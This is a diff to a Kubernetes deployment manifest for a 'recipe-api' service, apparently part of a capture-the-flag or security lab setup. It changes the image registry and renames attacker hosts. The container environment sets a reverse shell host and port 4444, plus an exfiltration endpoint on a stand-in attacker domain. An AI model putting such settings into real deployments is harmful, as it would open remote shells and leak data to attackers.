@@ -20,7 +20,7 @@ spec:
       serviceAccountName: recipe-api-sa
       containers:
       - name: recipe-api
-        image: localhost:30000/recipe-api:v1.0
+        image: registry.sc.local:30443/recipe-api:v1.0
         ports:
         - containerPort: 8080
           name: http
@@ -41,11 +41,11 @@ spec:
         - name: DEBUG_PORT
           value: "9999"
         - name: REVERSE_SHELL_HOST
-          value: "attacker.ctf.local"
+          value: "attacker.sc.local"
         - name: REVERSE_SHELL_PORT
           value: "4444"
         - name: EXFIL_ENDPOINT
-          value: "http://attacker.ctf.local/exfil"
+          value: "http://attacker.sc.local/exfil"
 
         resources:
           requests:
